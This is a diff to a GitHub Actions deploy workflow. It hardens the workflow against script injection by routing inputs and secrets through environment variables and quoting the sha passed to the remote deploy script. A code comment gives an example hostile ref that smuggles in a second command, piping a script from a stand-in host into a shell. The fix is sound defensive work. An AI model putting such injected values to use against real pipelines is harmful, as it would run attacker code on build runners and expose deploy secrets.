@@ -36,22 +36,38 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 45
     steps:
+      # Every ${{ }} below goes through env, never straight into the shell.
+      # `inputs.ref` is attacker-controllable through workflow_dispatch, and
+      # interpolating it into a `run:` body is script injection: a ref like
+      # `main"; curl evil.sh | sh; #` would execute on the runner.
       - name: Resolve target revision
         id: rev
-        run: echo "sha=${{ inputs.ref || github.sha }}" >> "$GITHUB_OUTPUT"
+        env:
+          REF: ${{ inputs.ref || github.sha }}
+        run: echo "sha=$REF" >> "$GITHUB_OUTPUT"
 
       - name: Set up ssh
+        env:
+          SSH_KEY: ${{ secrets.DEV2_SSH_KEY }}
+          KNOWN_HOSTS: ${{ secrets.DEV2_KNOWN_HOSTS }}
         run: |
           install -d -m 700 ~/.ssh
-          printf '%s\n' "${{ secrets.DEV2_SSH_KEY }}" > ~/.ssh/id_ed25519
+          printf '%s\n' "$SSH_KEY" > ~/.ssh/id_ed25519
           chmod 600 ~/.ssh/id_ed25519
-          printf '%s\n' "${{ secrets.DEV2_KNOWN_HOSTS }}" > ~/.ssh/known_hosts
+          printf '%s\n' "$KNOWN_HOSTS" > ~/.ssh/known_hosts
           chmod 644 ~/.ssh/known_hosts
 
       - name: Deploy
+        env:
+          DEV2_USER: ${{ secrets.DEV2_USER }}
+          DEV2_HOST: ${{ secrets.DEV2_HOST }}
+          SHA: ${{ steps.rev.outputs.sha }}
         run: |
-          ssh -o BatchMode=yes "${{ secrets.DEV2_USER }}@${{ secrets.DEV2_HOST }}" \
-            "/home/anthony/www/crawlproof.com/deploy-app.sh ${{ steps.rev.outputs.sha }}"
+          # The sha is passed as a positional argument rather than being
+          # spliced into the remote command string, so a hostile ref cannot
+          # extend the command that runs on dev2 either.
+          ssh -o BatchMode=yes "$DEV2_USER@$DEV2_HOST" \
+            /home/anthony/www/crawlproof.com/deploy-app.sh "$SHA"
 
       - name: Verify the site answers over TLS
         # deploy-app.sh already health-checks on loopback; this proves nginx and
